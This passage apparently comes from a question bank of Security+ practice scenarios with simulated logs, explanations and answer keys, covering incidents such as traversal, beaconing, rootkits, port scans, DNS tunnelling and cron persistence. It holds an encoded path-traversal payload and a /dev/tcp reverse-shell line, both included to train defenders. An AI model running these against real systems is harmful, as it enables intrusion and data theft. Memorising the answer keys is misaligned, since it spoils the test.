        "id": "dx",
        "type": "configure",
        "points": 1,
        "prompt": "What does the alert mean, and what should you do first?",
        "explanation": "Nobody gets from Manchester to Singapore in 37 minutes, so two successful sign-ins that far apart mean two different people are using the account. That is impossible travel. The business-trip answer fails on time. The VPN answer fails because the Singapore sign-in came from an unregistered device, not her laptop, and her laptop session stayed in Manchester. There are no failed attempts at all, so it is not spraying. The trap is resetting the password and stopping there. A reset stops new sign-ins, but the Singapore session that is already open can keep working until it is revoked, so do both together. Trusting the address or only geo-blocking leaves the attacker signed in.",
        "payload": {
          "slots": [
            {
              "id": "rootCause",
              "label": "What it means",
              "options": [
                {
                  "id": "a",
                  "text": "Impossible travel: someone else is signing in with her credentials"
                },
                {
                  "id": "b",
                  "text": "She is on a business trip and signed in from her hotel in Singapore"
                },
                {
                  "id": "c",
                  "text": "Her laptop's VPN client routed one of her own sign-ins through Singapore"
                },
                {
                  "id": "d",
                  "text": "Password spraying that has not yet got into the account"
                }
              ]
            },
            {
              "id": "fix",
              "label": "First response",
              "options": [
                {
                  "id": "a",
                  "text": "Reset her password, tell her to pick a stronger one and close the alert"
                },
                {
                  "id": "b",
                  "text": "Reset her password and revoke all of her active sessions"
                },
                {
                  "id": "c",
                  "text": "Add 203.0.113.140 to the trusted locations list"
                },
                {
                  "id": "d",
                  "text": "Block all sign-ins from Singapore and take no other action for now"
                }
              ]
            }
          ]
        },
        "answer": {
          "slots": {
            "rootCause": "a",
            "fix": "b"
          }
        }
      }
    ]
  },

  {
    "id": "sp-cli-03",
    "cert": "secplus",
    "archetype": "cli",
    "objective": "2.4",
    "topic": "Log investigation — web server",
    "title": "Odd requests to the statement download page",
    "estMinutes": 7,
    "scenario": "Customers download their statements from https://portal.example.com/download.php?file=<name>. This afternoon the SIEM flagged a burst of unusual requests to that page from 203.0.113.52. You have a shell on the web server, WEB-01. Find out what the requests were trying to do and whether they worked, then decide what happened and what to do.",
    "cliFault": {
      "fault": "traversal"
    },
    "assets": {
      "reference": {
        "kind": "terminal",
        "host": "WEB-01",
        "session": "ssh",
        "reveal": "external",
        "excerpts": [
          {
            "id": "svc",
            "necessary": false,
            "promptLine": "systemctl status web --no-pager | head -n 3",
            "reveal": "svc",
            "lines": [
              {
                "text": "● web.service - Customer portal web server"
              },
              {
                "text": "     Loaded: loaded (/etc/systemd/system/web.service; enabled)"
              },
              {
                "text": "     Active: active (running) since Fri 2026-10-02 22:10:04 UTC; 3 days ago"
              }
            ]
          },
          {
            "id": "access",
            "necessary": true,
            "promptLine": "grep \"download.php\" /var/log/web/access.log | grep 203.0.113.52",
            "reveal": "access",
            "lines": [
              {
                "text": "203.0.113.52 - - [06/Oct/2026:14:02:11 +0000] \"GET /download.php?file=statement-10442-0925.pdf HTTP/1.1\" 200 48211"
              },
              {
                "text": "203.0.113.52 - - [06/Oct/2026:14:02:19 +0000] \"GET /download.php?file=../../../../etc/passwd HTTP/1.1\" 403 199"
              },
              {
                "text": "203.0.113.52 - - [06/Oct/2026:14:02:26 +0000] \"GET /download.php?file=..%2f..%2f..%2f..%2fetc%2fpasswd HTTP/1.1\" 200 2304"
              },
              {
                "text": "203.0.113.52 - - [06/Oct/2026:14:02:31 +0000] \"GET /download.php?file=..%2f..%2f..%2f..%2fetc%2fshadow HTTP/1.1\" 404 196"
              },
              {
                "text": "203.0.113.52 - - [06/Oct/2026:14:02:40 +0000] \"GET /download.php?file=..%2f..%2fapp%2f.env HTTP/1.1\" 200 911"
              }
            ]
          },
          {
            "id": "files",
            "necessary": false,
            "promptLine": "ls -l /var/www/html/files | head -n 3",
            "reveal": "files",
            "lines": [
              {
                "text": "total 18244"
              },
              {
                "text": "-rw-r----- 1 www-data www-data 48211 Oct  1 09:00 statement-10442-0925.pdf"
              },
              {
                "text": "-rw-r----- 1 www-data www-data 51007 Oct  1 09:00 statement-10443-0925.pdf"
              }
            ]
          },
          {
            "id": "errlog",
            "necessary": true,
            "promptLine": "grep 203.0.113.52 /var/log/web/error.log",
            "reveal": "errlog",
            "lines": [
              {
                "text": "[2026-10-06 14:02:31] [warn] [client 203.0.113.52] readfile(/var/www/html/files/../../../../etc/shadow): Failed to open stream: Permission denied in /var/www/html/download.php on line 14"
              }
            ]
          },
          {
            "id": "last",
            "necessary": false,
            "promptLine": "last -n 2",
            "reveal": "last",
            "lines": [
              {
                "text": "webadm   pts/0    10.20.0.31    Tue Oct  6 09:14 - 09:40  (00:26)"
              },
              {
                "text": "webadm   pts/0    10.20.0.31    Mon Oct  5 16:02 - 16:20  (00:18)"
              }
            ]
          }
        ]
      }
    },
    "steps": [
      {
        "id": "cmds",
        "type": "analyze",
        "points": 1,
        "prompt": "Select the commands that show what the requests were after and what the server actually did with them.",
        "explanation": "The access log shows the requests: one normal statement download, then the file parameter climbing out of the folder with ../. The plain version got a 403, but the URL-encoded version (%2f is a slash) got a 200 and 2,304 bytes of /etc/passwd, and .env came back with 911 bytes. The error log proves the parameter reaches the file system unchecked: download.php tried to open /etc/shadow, and only the operating system's file permissions stopped it. The service status, the folder listing and the admin logins do not show the attack.",
        "payload": {
          "multi": true,
          "mode": "reveal",
          "scoring": "lenient"
        },
        "answer": {
          "selected": [
            "access",
            "errlog"
          ]
        }
      },
      {
        "id": "dx",
        "type": "configure",
        "points": 1,
        "prompt": "What happened, and what is the right fix?",
        "explanation": "Every malicious request uses ../ to step up out of the download folder towards /etc and the app's own config. That is directory traversal. No request contains SQL syntax or a script tag, and the attacker is not guessing statement names. The trap is the ../ filter: this site already had one, and the log shows the attacker beat it by URL-encoding the slash. The real fix is to check the requested name against an allow-list of files the page may serve, or to resolve the full path and reject anything outside the folder. Because .env was downloaded, treat its database password and API keys as stolen and rotate them.",
        "payload": {
          "slots": [
            {
              "id": "rootCause",
              "label": "What happened",
              "options": [
                {
                  "id": "a",
                  "text": "SQL injection: crafted input in the parameter altered the statement lookup query"
                },
                {
                  "id": "b",
                  "text": "Cross-site scripting: script tags were stored in the file parameter"
                },
                {
                  "id": "c",
                  "text": "Directory traversal: ../ sequences reached files outside the folder"
                },
                {
                  "id": "d",
                  "text": "Enumeration: guessing other customers' statement file names"
                }
              ]
            },
            {
              "id": "fix",
              "label": "Fix",
              "options": [
                {
                  "id": "a",
                  "text": "Allow-list the files the page may serve, and rotate the secrets in .env"
                },
                {
                  "id": "b",
                  "text": "Add a filter that rejects any request containing the string ../ in the file parameter"
                },
                {
                  "id": "c",
                  "text": "Switch the statement lookup to parameterised queries"
                },
                {
                  "id": "d",
                  "text": "HTML-encode the file name before showing it on the page"
                }
              ]
            }
          ]
        },
        "answer": {
          "slots": {
            "rootCause": "c",
            "fix": "a"
          }
        }
      }
    ]
  },

  {
    "id": "sp-cli-04",
    "cert": "secplus",
    "archetype": "cli",
    "objective": "4.4",
    "topic": "Alert validation — endpoint connections",
    "title": "Validate an outbound-connection alert",
    "estMinutes": 6,
    "scenario": "At 07:45 the SIEM raised an alert: finance workstation FIN-WS07 (10.30.8.27) has sent traffic to the same outside address every 60 seconds since 01:12, including overnight when nobody was signed in. Before anyone acts, the alert needs validating. You have a remote shell on FIN-WS07. Run the commands that confirm or rule out the alert, then decide what it is and what to do first.",
    "cliFault": {
      "fault": "c2"
    },
    "assets": {
      "reference": {
        "kind": "terminal",
        "host": "FIN-WS07",
        "session": "ssh",
        "reveal": "external",
        "excerpts": [
          {
            "id": "ip",
            "necessary": false,
            "promptLine": "ip -brief address show eth0",
            "reveal": "ip",
            "lines": [
              {
                "text": "eth0             UP             10.30.8.27/24"
              }
            ]
          },
          {
            "id": "netstat",
            "necessary": true,
            "promptLine": "sudo netstat -antp | grep ESTABLISHED",
            "reveal": "netstat",
            "lines": [
              {
                "text": "tcp        0      0 10.30.8.27:22           10.30.1.5:51544         ESTABLISHED 1022/sshd: analyst"
              },
              {
                "text": "tcp        0      0 10.30.8.27:41876        10.30.1.20:443          ESTABLISHED 2311/fin-client"
              },
              {
                "text": "tcp        0      0 10.30.8.27:53312        203.0.113.66:4444       ESTABLISHED 4120/kworkerd"
              }
            ]
          },
          {
            "id": "uptime",
            "necessary": false,
            "promptLine": "uptime",
            "reveal": "uptime",
            "lines": [
              {
                "text": " 07:52:40 up 9 days,  2:31,  1 user,  load average: 0.11, 0.09, 0.04"
              }
            ]
          },
          {
            "id": "exe",
            "necessary": true,
            "promptLine": "sudo ls -l /proc/4120/exe",
            "reveal": "exe",
            "lines": [
              {
                "text": "lrwxrwxrwx 1 jmarsh jmarsh 0 Oct  8 01:12 /proc/4120/exe -> /tmp/.cache/kworkerd (deleted)"
              }
            ]
          },
          {
            "id": "df",
            "necessary": false,
            "promptLine": "df -h /tmp",
            "reveal": "df",
            "lines": [
              {
                "text": "Filesystem      Size  Used Avail Use% Mounted on"
              },
              {
                "text": "/dev/sda2        40G   11G   27G  29% /"
              }
            ]
          }
        ]
      }
    },
    "steps": [
      {
        "id": "cmds",
        "type": "analyze",
        "points": 1,
        "prompt": "Select the commands that confirm or rule out the alert on the host itself.",
        "explanation": "`netstat` ties the traffic to a process: PID 4120, called kworkerd, holds a live connection to 203.0.113.66 on port 4444. `ls -l /proc/4120/exe` shows where that program came from: a hidden folder in /tmp, owned by an ordinary user, and already deleted from disk while it keeps running. Real kworker threads belong to the kernel and have no program file at all. The interface address, uptime and disk space tell you nothing about the connection.",
        "payload": {
          "multi": true,
          "mode": "reveal",
          "scoring": "lenient"
        },
        "answer": {
          "selected": [
            "netstat",
            "exe"
          ]
        }
      },
      {
        "id": "dx",
        "type": "configure",
        "points": 1,
        "prompt": "What is the alert showing, and what should you do first?",
        "explanation": "A check-in every 60 seconds, overnight, from a program posing as a kernel thread and running from a deleted file in /tmp is command-and-control beaconing. An update check would come from a real installed program, one connection checking in once a minute is not a denial-of-service attack, and nothing here points to file sharing. Quarantining the workstation cuts the attacker off and keeps the evidence. Powering off is the trap: the program has been deleted from disk, so the running process in memory is the only copy left, and shutting down destroys it. Killing the process loses that copy too and does nothing about whatever started it. Tuning the rule would hide a real compromise.",
        "payload": {
          "slots": [
            {
              "id": "rootCause",
              "label": "What it is",
              "options": [
                {
                  "id": "a",
                  "text": "A false positive: a routine software update check running on a timer"
                },
                {
                  "id": "b",
                  "text": "An outbound denial-of-service attack from the workstation"
                },
                {
                  "id": "c",
                  "text": "A user running an unapproved file-sharing app"
                },
                {
                  "id": "d",
                  "text": "Command-and-control beaconing from a disguised process in /tmp"
                }
              ]
            },
            {
              "id": "fix",
              "label": "First response",
              "options": [
                {
                  "id": "a",
                  "text": "Quarantine the workstation, leaving it powered on"
                },
                {
                  "id": "b",
                  "text": "Power the workstation off straight away to stop the traffic"
                },
                {
                  "id": "c",
                  "text": "Kill process 4120, delete /tmp/.cache and close the alert"
                },
                {
                  "id": "d",
                  "text": "Tune the SIEM rule to ignore port 4444"
                }
              ]
            }
          ]
        },
        "answer": {
          "slots": {
            "rootCause": "d",
            "fix": "a"
          }
        }
      }
    ]
  },

  {
    "id": "sp-cli-05",
    "cert": "secplus",
    "archetype": "cli",
    "objective": "4.4",
    "topic": "Alert validation — file integrity",
    "title": "Integrity alert on a web server",
    "estMinutes": 7,
    "scenario": "Overnight, the file integrity monitoring agent on WEB-02 raised a high-priority alert that monitored system files had changed. The server runs the public website and is patched through its normal package manager. You have a shell on WEB-02. Validate the alert, then decide what happened and how to respond.",
    "cliFault": {
      "fault": "integrity"
    },
    "assets": {
      "reference": {
        "kind": "terminal",
        "host": "WEB-02",
        "session": "ssh",
        "reveal": "external",
        "excerpts": [
          {
            "id": "uptime",
            "necessary": false,
            "promptLine": "uptime",
            "reveal": "uptime",
            "lines": [
              {
                "text": " 08:05:19 up 41 days,  3:12,  1 user,  load average: 0.31, 0.27, 0.22"
              }
            ]
          },
          {
            "id": "fim",
            "necessary": true,
            "promptLine": "fim-agent report --since 24h",
            "reveal": "fim",
            "lines": [
              {
                "text": "TIME (UTC)           CHANGE    PATH              SHA-256 (old -> new)      SIZE (old -> new)"
              },
              {
                "text": "2026-10-09 03:17:44  MODIFIED  /usr/bin/ps       22a8...7f10 -> c91e...5b3d  133432 -> 149016"
              },
              {
                "text": "2026-10-09 03:17:44  MODIFIED  /usr/bin/ls       9f1c...e2a4 -> 4b7d...01c9  142312 -> 155880"
              },
              {
                "text": "2026-10-09 03:17:44  MODIFIED  /usr/bin/netstat  6d0e...aa31 -> 0e57...d6f2  155008 -> 171224"
              }
            ]
          },
          {
            "id": "who",
            "necessary": false,
            "promptLine": "who",
            "reveal": "who",
            "lines": [
              {
                "text": "analyst  pts/0        2026-10-09 08:03 (10.20.0.15)"
              }
            ]
          },
          {
            "id": "pkg",
            "necessary": true,
            "promptLine": "tail -n 3 /var/log/pkg-history.log",
            "reveal": "pkg",
            "lines": [
              {
                "text": "2026-09-17 10:02:11 upgrade libssl3 3.0.13-1 -> 3.0.15-1"
              },
              {
                "text": "2026-09-17 10:02:14 upgrade tzdata 2026a-1 -> 2026b-1"
              },
              {
                "text": "2026-09-17 10:02:20 upgrade ca-certificates 20240203 -> 20250419"
              }
            ]
          },
          {
            "id": "df",
            "necessary": false,
            "promptLine": "df -h /",
            "reveal": "df",
            "lines": [
              {
                "text": "Filesystem      Size  Used Avail Use% Mounted on"
              },
              {
                "text": "/dev/sda1        60G   19G   38G  34% /"
              }
            ]
          }
        ]
      }
    },
    "steps": [
      {
        "id": "cmds",
        "type": "analyze",
        "points": 1,
        "prompt": "Select the commands that show what changed and whether routine patching could explain it.",
        "explanation": "The integrity report shows what changed: ps, ls and netstat were all replaced within the same second at 03:17, each with a new hash and a bigger file. The package history shows the last update on this server was on 17 September and touched none of those tools, so patching does not explain the change. Uptime, the signed-in users and disk space say nothing about the files.",
        "payload": {
          "multi": true,
          "mode": "reveal",
          "scoring": "lenient"
        },
        "answer": {
          "selected": [
            "fim",
            "pkg"
          ]
        }
      },
      {
        "id": "dx",
        "type": "configure",
        "points": 1,
        "prompt": "What happened, and how should you respond?",
        "explanation": "ps, ls and netstat are the tools an administrator uses to look at running processes, files and network connections. Replacing all three at once, outside any update, is how a rootkit hides an attacker: the new versions simply leave the attacker's activity out of their output. Corruption would not neatly grow three related files in the same second, and an agent update would not change the files' hashes. Whoever wrote to /usr/bin had root, so nothing on the server can be trusted. Isolate it, keep an image for the investigation, and rebuild from a known-good image. Reinstalling three packages only fixes the three files you know about. Running the server's own ps or netstat is the trap, because those are the tools that now lie.",
        "payload": {
          "slots": [
            {
              "id": "rootCause",
              "label": "What happened",
              "options": [
                {
                  "id": "a",
                  "text": "Routine patching: an overnight update replaced the three tools"
                },
                {
                  "id": "b",
                  "text": "Rootkit: ps, ls and netstat were swapped for trojanised copies"
                },
                {
                  "id": "c",
                  "text": "Disk corruption: bad sectors altered the three files"
                },
                {
                  "id": "d",
                  "text": "False positive: the agent re-baselined after its own update"
                }
              ]
            },
            {
              "id": "fix",
              "label": "Response",
              "options": [
                {
                  "id": "a",
                  "text": "Accept the new hashes as the baseline and close the alert"
                },
                {
                  "id": "b",
                  "text": "Reinstall the three packages from the repository and return the server to service"
                },
                {
                  "id": "c",
                  "text": "Run ps and netstat on WEB-02 to look for the attacker"
                },
                {
                  "id": "d",
                  "text": "Isolate WEB-02, image it, then rebuild from a known-good image"
                }
              ]
            }
          ]
        },
        "answer": {
          "slots": {
            "rootCause": "b",
            "fix": "d"
          }
        }
      }
    ]
  },

  {
    "id": "sp-cli-06",
    "cert": "secplus",
    "archetype": "cli",
    "objective": "4.9",
    "topic": "Log investigation — firewall",
    "title": "Burst of denied traffic at the perimeter",
    "estMinutes": 6,
    "scenario": "At 09:14 the perimeter firewall logged a sudden burst of denied connections from 198.51.100.73 to the DMZ web server, public address 192.0.2.10. The web server should only be reachable on HTTPS. You have a shell on LOG-01, which collects the firewall log. Work out what the burst was and whether any of it got through, then decide what it was and what to do.",
    "cliFault": {
      "fault": "portscan"
    },
    "assets": {
      "reference": {
        "kind": "terminal",
        "host": "LOG-01",
        "session": "ssh",
        "reveal": "external",
        "excerpts": [
          {
            "id": "whois",
            "necessary": false,
            "promptLine": "whois 198.51.100.73 | grep -i country",
            "reveal": "whois",
            "lines": [
              {
                "text": "country:        NL"
              }
            ]
          },
          {
            "id": "deny",
            "necessary": true,
            "promptLine": "grep 198.51.100.73 /var/log/fw/perimeter.log | head -n 8",
            "reveal": "deny",
            "lines": [
              {
                "text": "2026-10-07T09:14:02.118Z DENY  TCP 198.51.100.73:61022 -> 192.0.2.10:3306 flags=S"
              },
              {
                "text": "2026-10-07T09:14:02.119Z DENY  TCP 198.51.100.73:61022 -> 192.0.2.10:22 flags=S"
              },
              {
                "text": "2026-10-07T09:14:02.121Z DENY  TCP 198.51.100.73:61022 -> 192.0.2.10:8080 flags=S"
              },
              {
                "text": "2026-10-07T09:14:02.122Z DENY  TCP 198.51.100.73:61022 -> 192.0.2.10:445 flags=S"
              },
              {
                "text": "2026-10-07T09:14:02.124Z DENY  TCP 198.51.100.73:61022 -> 192.0.2.10:21 flags=S"
              },
              {
                "text": "2026-10-07T09:14:02.125Z DENY  TCP 198.51.100.73:61022 -> 192.0.2.10:5900 flags=S"
              },
              {
                "text": "2026-10-07T09:14:02.127Z DENY  TCP 198.51.100.73:61022 -> 192.0.2.10:110 flags=S"
              },
              {
                "text": "2026-10-07T09:14:02.128Z DENY  TCP 198.51.100.73:61022 -> 192.0.2.10:25 flags=S"
              }
            ]
          },
          {
            "id": "count",
            "necessary": false,
            "promptLine": "grep -c 198.51.100.73 /var/log/fw/perimeter.log",
            "reveal": "count",
            "lines": [
              {
                "text": "1000"
              }
            ]
          },
          {
            "id": "allow",
            "necessary": true,
            "promptLine": "grep 198.51.100.73 /var/log/fw/perimeter.log | grep ALLOW",
            "reveal": "allow",
            "lines": [
              {
                "text": "2026-10-07T09:14:02.412Z ALLOW TCP 198.51.100.73:61022 -> 192.0.2.10:443 flags=S"
              },
              {
                "text": "2026-10-07T09:14:03.067Z ALLOW TCP 198.51.100.73:61022 -> 192.0.2.10:3389 flags=S"
              }
            ]
          },
          {
            "id": "recent",
            "necessary": false,
            "promptLine": "tail -n 3 /var/log/fw/perimeter.log",
            "reveal": "recent",
            "lines": [
              {
                "text": "2026-10-07T09:31:40.552Z ALLOW TCP 203.0.113.201:52211 -> 192.0.2.10:443 flags=S"
              },
              {
                "text": "2026-10-07T09:31:41.008Z ALLOW TCP 198.51.100.140:61877 -> 192.0.2.10:443 flags=S"
              },
              {
                "text": "2026-10-07T09:31:41.390Z ALLOW TCP 203.0.113.18:49302 -> 192.0.2.10:443 flags=S"
              }
            ]
          }
        ]
      }
    },
    "steps": [
      {
        "id": "cmds",
        "type": "analyze",
        "points": 1,
        "prompt": "Select the commands that show what the burst was and what got through.",
        "explanation": "The first eight log lines show the pattern: one source, a different destination port on every line (3306, 22, 8080, 445 and so on), a single SYN each, about a millisecond apart. Filtering the same source for ALLOW shows what the firewall let through: 443, which is expected, and 3389 (remote desktop), which should not be reachable from the internet at all. The country lookup, the total count and the latest log lines add colour but do not change the answer.",
        "payload": {
          "multi": true,
          "mode": "reveal",
          "scoring": "lenient"
        },
        "answer": {
          "selected": [
            "deny",
            "allow"
          ]
        }
      },
      {
        "id": "dx",
        "type": "configure",
        "points": 1,
        "prompt": "What was the burst, and what should you do?",
        "explanation": "One probe per port across many ports in a couple of seconds is reconnaissance: a port scan looking for services to attack. A SYN flood hammers one port with huge volume, and 443 got exactly one SYN. Nothing shows a remote desktop session was set up, only that the firewall let the first packet through, so calling it a breach goes too far. It is not a ping sweep either, because it hit one host over TCP. The trap is \"every probe was denied\". Not every probe was: the firewall let 3389 through from the internet when only HTTPS should be reachable. Remove that rule, and block the scanning address while you check whether anything has since tried to sign in on 3389.",
        "payload": {
          "slots": [
            {
              "id": "rootCause",
              "label": "What it was",
              "options": [
                {
                  "id": "a",
                  "text": "A port scan: one SYN to each of many ports, milliseconds apart"
                },
                {
                  "id": "b",
                  "text": "A SYN flood: a denial-of-service attack aimed at the HTTPS service"
                },
                {
                  "id": "c",
                  "text": "A successful remote desktop break-in to the web server"
                },
                {
                  "id": "d",
                  "text": "A ping sweep mapping live hosts across the DMZ"
                }
              ]
            },
            {
              "id": "fix",
              "label": "Response",
              "options": [
                {
                  "id": "a",
                  "text": "Nothing: every probe was denied, so the firewall did its job"
                },
                {
                  "id": "b",
                  "text": "Enable SYN cookies on the web server to absorb the flood"
                },
                {
                  "id": "c",
                  "text": "Declare a breach and rebuild the web server"
                },
                {
                  "id": "d",
                  "text": "Block the source and remove the rule exposing 3389"
                }
              ]
            }
          ]
        },
        "answer": {
          "slots": {
            "rootCause": "a",
            "fix": "d"
          }
        }
      }
    ]
  },

  {
    "id": "sp-cli-07",
    "cert": "secplus",
    "archetype": "cli",
    "objective": "4.9",
    "topic": "Log investigation — DNS",
    "title": "Unusual DNS volume from one workstation",
    "estMinutes": 7,
    "scenario": "Since about 10:00, the internal DNS resolver DNS-01 has been answering far more queries from 10.40.6.31, an HR workstation, than from any other machine. You have a shell on DNS-01. Look at what the client has been asking for, then decide what is happening and what to do first.",
    "cliFault": {
      "fault": "dnsTunnel"
    },
    "assets": {
      "reference": {
        "kind": "terminal",
        "host": "DNS-01",
        "session": "ssh",
        "reveal": "external",
        "excerpts": [
          {
            "id": "uptime",
            "necessary": false,
            "promptLine": "uptime",
            "reveal": "uptime",
            "lines": [
              {
                "text": " 10:41:07 up 22 days,  4:18,  1 user,  load average: 0.94, 0.88, 0.71"
              }
            ]
          },
          {
            "id": "queries",
            "necessary": true,
            "promptLine": "grep \"client=10.40.6.31\" /var/log/dns/query.log | head -n 4",
            "reveal": "queries",
            "lines": [
              {
                "text": "2026-10-06T10:02:13.218Z client=10.40.6.31 qtype=TXT qname=706179726f6c6c5f71332e786c7378.0001.x7.cdn-sync.example rcode=NOERROR"
              },
              {
                "text": "2026-10-06T10:02:13.611Z client=10.40.6.31 qtype=TXT qname=504b0304140006000800000021006b2f1c3e8e010000e7040000.0002.x7.cdn-sync.example rcode=NOERROR"
              },
              {
                "text": "2026-10-06T10:02:14.007Z client=10.40.6.31 qtype=TXT qname=130000005b436f6e74656e745f54797065735d2e786d6cad94cb.0003.x7.cdn-sync.example rcode=NOERROR"
              },
              {
                "text": "2026-10-06T10:02:14.402Z client=10.40.6.31 qtype=TXT qname=6ec2300c45f7487c87d5b6a5b0e04ac0cdc8a9a8bd16fdd8c3c4.0004.x7.cdn-sync.example rcode=NOERROR"
              }
            ]
          },
          {
            "id": "lease",
            "necessary": false,
            "promptLine": "grep -A1 \"lease 10.40.6.31\" /var/lib/dhcp/leases",
            "reveal": "lease",
            "lines": [
              {
                "text": "lease 10.40.6.31 {"
              },
              {
                "text": "  client-hostname \"HR-WS12\";"
              }
            ]
          },
          {
            "id": "whois",
            "necessary": true,
            "promptLine": "whois cdn-sync.example | grep -iE \"creation date|registrar:\"",
            "reveal": "whois",
            "lines": [
              {
                "text": "Creation Date: 2026-10-04T21:14:09Z"
              },
              {
                "text": "Registrar: Example Registrar, LLC"
              }
            ]
          }
        ]
      }
    },
    "steps": [
      {
        "id": "cmds",
        "type": "analyze",
        "points": 1,
        "prompt": "Select the commands that show what the workstation is sending and who it is talking to.",
        "explanation": "The query log shows the pattern: TXT lookups several times a second, each for a different, very long name made of hex, with a counter (0001, 0002 and so on) in front of the same domain. The first label decodes from hex to payroll_q3.xlsx, and the next one starts with 504b0304, the header every .xlsx (zip) file begins with. The registration lookup shows cdn-sync.example was created on 4 October, two days before this traffic, so it is not an established content-delivery service. Uptime and the DHCP lease only tell you about the server and which machine holds the address.",
        "payload": {
          "multi": true,
          "mode": "reveal",
          "scoring": "lenient"
        },
        "answer": {
          "selected": [
            "queries",
            "whois"
          ]
        }
      },
      {
        "id": "dx",
        "type": "configure",
        "points": 1,
        "prompt": "What is happening, and what should you do first?",
        "explanation": "A file is being cut into chunks, hex-encoded and sent out as the names being looked up, and the attacker's name server for cdn-sync.example collects the pieces. That is DNS tunnelling, used here to exfiltrate data. Cache poisoning plants forged answers in a resolver, but these are queries from one client. Amplification uses spoofed requests to make resolvers flood a victim, and nothing here is spoofed. A stuck app repeats the same name, while every name here is different and counts upwards. Sinkholing the domain stops the transfer for every machine at once, and isolating the workstation lets you find the malware sending it. Flushing the cache is the fix for poisoning and does nothing here.",
        "payload": {
          "slots": [
            {
              "id": "rootCause",
              "label": "What is happening",
              "options": [
                {
                  "id": "a",
                  "text": "DNS cache poisoning: forged answers are being planted in the resolver"
                },
                {
                  "id": "b",
                  "text": "DNS tunnelling: a file is leaving hex-encoded inside query names"
                },
                {
                  "id": "c",
                  "text": "DNS amplification: the resolver is being used to flood a victim"
                },
                {
                  "id": "d",
                  "text": "A misconfigured app retrying the same lookup in a loop"
                }
              ]
            },
            {
              "id": "fix",
              "label": "First response",
              "options": [
                {
                  "id": "a",
                  "text": "Flush the resolver cache and restart the DNS service"
                },
                {
                  "id": "b",
                  "text": "Rate-limit responses on the resolver to stop the outbound flood"
                },
                {
                  "id": "c",
                  "text": "Restart the app on the workstation to clear the loop"
                },
                {
                  "id": "d",
                  "text": "Sinkhole the domain on the resolver and isolate 10.40.6.31"
                }
              ]
            }
          ]
        },
        "answer": {
          "slots": {
            "rootCause": "b",
            "fix": "d"
          }
        }
      }
    ]
  },

  {
    "id": "sp-cli-08",
    "cert": "secplus",
    "archetype": "cli",
    "objective": "4.9",
    "topic": "Log investigation — endpoint",
    "title": "Repeat outbound alert on an app server",
    "estMinutes": 7,
    "scenario": "Yesterday the SOC killed a suspicious process on Linux app server APP-03 that was talking to 198.51.100.19, and the server was rebooted at 06:40 this morning. This morning the SIEM shows APP-03 connecting to 198.51.100.19 again at 07:05, 08:05 and 09:05. You have a shell on APP-03, and it is now 09:40. Find out what keeps starting the connection, then decide what it is and what to do.",
    "cliFault": {
      "fault": "persistence"
    },
    "assets": {
      "reference": {
        "kind": "terminal",
        "host": "APP-03",
        "session": "ssh",
        "reveal": "external",
        "excerpts": [
          {
            "id": "ss",
            "necessary": false,
            "promptLine": "sudo ss -tnp dst 198.51.100.19",
            "reveal": "ss",
            "lines": [
              {
                "text": "State   Recv-Q  Send-Q  Local Address:Port  Peer Address:Port  Process"
              }
            ]
          },
          {
            "id": "timers",
            "necessary": false,
            "promptLine": "systemctl list-timers --no-pager | head -n 3",
            "reveal": "timers",
            "lines": [
              {
                "text": "NEXT                         LEFT          LAST                         PASSED      UNIT             ACTIVATES"
              },
              {
                "text": "Sat 2026-10-10 00:00:00 UTC  14h left      Fri 2026-10-09 00:00:01 UTC  9h ago      logrotate.timer  logrotate.service"
              },
              {
                "text": "Mon 2026-10-12 00:00:00 UTC  2 days left   Mon 2026-10-05 00:00:04 UTC  4 days ago  fstrim.timer     fstrim.service"
              }
            ]
          },
          {
            "id": "crontab",
            "necessary": true,
            "promptLine": "sudo grep -rv \"^#\" /var/spool/cron/crontabs",
            "reveal": "crontab",
            "lines": [
              {
                "text": "/var/spool/cron/crontabs/www-data:5 * * * * /var/tmp/.sysupd >/dev/null 2>&1"
              }
            ]
          },
          {
            "id": "crond",
            "necessary": false,
            "promptLine": "ls /etc/cron.d",
            "reveal": "crond",
            "lines": [
              {
                "text": "sysstat"
              }
            ]
          },
          {
            "id": "script",
            "necessary": true,
            "promptLine": "cat /var/tmp/.sysupd",
            "reveal": "script",
            "lines": [
              {
                "text": "#!/bin/bash"
              },
              {
                "text": "bash -i >& /dev/tcp/198.51.100.19/443 0>&1"
              }
            ]
          }
        ]
      }
    },
    "steps": [
      {
        "id": "cmds",
        "type": "analyze",
        "points": 1,
        "prompt": "Select the commands that show what is starting the connection and what it runs.",
        "explanation": "The web service account www-data has a crontab entry that runs /var/tmp/.sysupd at five minutes past every hour, which matches 07:05, 08:05 and 09:05 exactly. The script opens an interactive shell and hands it to 198.51.100.19 over port 443. The socket list shows no open connection to 198.51.100.19 right now, so nothing is running between check-ins. The system timers and /etc/cron.d hold only routine jobs.",
        "payload": {
          "multi": true,
          "mode": "reveal",
          "scoring": "lenient"
        },
        "answer": {
          "selected": [
            "crontab",
            "script"
          ]
        }
      },
      {
        "id": "dx",
        "type": "configure",
        "points": 1,
        "prompt": "What is going on, and what should you do?",
        "explanation": "The attacker left a scheduled job behind so their access comes back on its own. That is persistence, and it is why killing the process and rebooting did not help: the crontab survives a reboot and starts the shell again at the next :05. The reboot ended yesterday's process and the socket list shows no live connection now, so each hourly connection is a fresh launch. A worm would reach out to other internal machines, not call one outside address on a timer, and a hidden file in /var/tmp that hands a shell to an outside address is not an update job. Keep a copy of the script, remove the cron entry and block the address. Changing the www-data password is the trap: cron runs the job without any password. Then find out how the attacker got code running as www-data, most likely through the web application.",
        "payload": {
          "slots": [
            {
              "id": "rootCause",
              "label": "What it is",
              "options": [
                {
                  "id": "a",
                  "text": "Yesterday's process was never killed and has been running ever since"
                },
                {
                  "id": "b",
                  "text": "A worm on APP-03 spreading to other servers every hour"
                },
                {
                  "id": "c",
                  "text": "Persistence: a cron job relaunches a reverse shell every hour"
                },
                {
                  "id": "d",
                  "text": "A legitimate hourly update job contacting its vendor"
                }
              ]
            },
            {
              "id": "fix",
              "label": "Response",
              "options": [
                {
                  "id": "a",
                  "text": "Kill the process each time the SIEM shows it reconnecting"
                },
                {
                  "id": "b",
                  "text": "Reboot the server again and confirm the process is gone"
                },
                {
                  "id": "c",
                  "text": "Save the script, remove the cron entry, block 198.51.100.19"
                },
                {
                  "id": "d",
                  "text": "Change the password on the www-data account so the attacker is locked out"
                }
              ]
            }
          ]
        },
        "answer": {
          "slots": {
            "rootCause": "c",
            "fix": "c"
          }
        }
      }
    ]
  },

  // ===== v8.156.0 — secure network design PBQs (diagram), SY0-701 3.1 3.2 3.4; two-reviewer gate passed 2026-10-11 =====
  {
    "id": "sp-dg-01",
